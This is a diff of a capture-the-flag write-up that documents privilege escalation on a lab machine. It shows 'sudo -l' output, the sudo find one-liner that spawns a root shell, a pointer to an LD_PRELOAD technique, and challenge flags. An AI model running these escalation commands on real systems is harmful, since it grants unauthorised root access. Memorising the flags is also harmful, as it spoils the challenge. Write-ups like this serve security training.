@@ -496,6 +496,8 @@ User flag : thnb{m4b9a_w4l0_4lm0jt4h1D}
 
 ### Privsec
 
+Let's start by checking if we can run something as root
+```bash
 c3p0@thehackernewsbdarija:~$ sudo -l
 Matching Defaults entries for c3p0 on thehackernewsbdarija:
     env_reset, mail_badpass,
@@ -504,8 +506,11 @@ Matching Defaults entries for c3p0 on thehackernewsbdarija:
 User c3p0 may run the following commands on thehackernewsbdarija:
     (ALL : ALL) NOPASSWD: /usr/bin/find
 c3p0@thehackernewsbdarija:~$
+```
 
 https://gtfobins.github.io/gtfobins/find/
+
+We can escalte to root using ```sudo find . -exec /bin/sh \; -quit``` 
 
 ```bash
 c3p0@thehackernewsbdarija:~$ sudo /usr/bin/find . -exec /bin/sh \; -quit
@@ -549,4 +554,6 @@ thnb{br4v0_4kh4y_lH4ck3r_y0u_d1D_1t}
 #
 ```
 
+There another technique it's the "env_keep+=LD_PRELOAD" we can use a malicious library with the sudo binary find 
 
+https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
